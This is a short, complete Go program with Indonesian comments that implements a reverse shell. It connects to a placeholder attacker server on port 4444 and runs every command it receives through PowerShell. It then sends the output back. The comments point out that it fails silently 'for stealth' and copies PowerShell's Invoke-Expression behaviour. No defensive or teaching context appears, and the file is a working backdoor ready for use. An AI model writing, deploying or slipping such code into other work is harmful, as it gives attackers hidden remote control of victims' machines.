package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
    "os/exec"
    "strings"
)

func main() {
    // --- Konfigurasi Koneksi ---
    // Ganti dengan IP dan Port server Anda
    serverAddr := "IP_SERVER_GO:4444" 

    // --- Terhubung ke Server ---
    conn, err := net.Dial("tcp", serverAddr)
    if err != nil {
        // Jika koneksi gagal, program akan keluar tanpa menampilkan pesan error (untuk stealth)
        // fmt.Println("Error connecting to server:", err)
        os.Exit(1)
    }
    defer conn.Close()

    // Loop utama untuk menerima dan mengeksekusi perintah
    for {
        // Baca perintah dari server
        command, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
            // Jika server menutup koneksi, keluar dari loop
            break
        }

        // Hapus karakter newline di akhir perintah
        command = strings.TrimSpace(command)

        // Jika menerima perintah 'exit', tutup koneksi
        if command == "exit" {
            break
        }

        // --- Eksekusi Perintah Menggunakan PowerShell ---
        // Ini adalah kunci untuk meniru perilaku iex (Invoke-Expression)
        cmd := exec.Command("powershell.exe", "-Command", command)
        
        // Tangkap output (stdout dan stderr) dari perintah
        output, err := cmd.CombinedOutput()
        
        // Kirim hasil eksekusi kembali ke server
        // Jika ada error, kirim pesan error
        if err != nil {
            fmt.Fprintf(conn, "Error: %s\n", err)
        } else {
            // Kirim output dari perintah
            fmt.Fprintf(conn, "%s\n", output)
        }
    }
}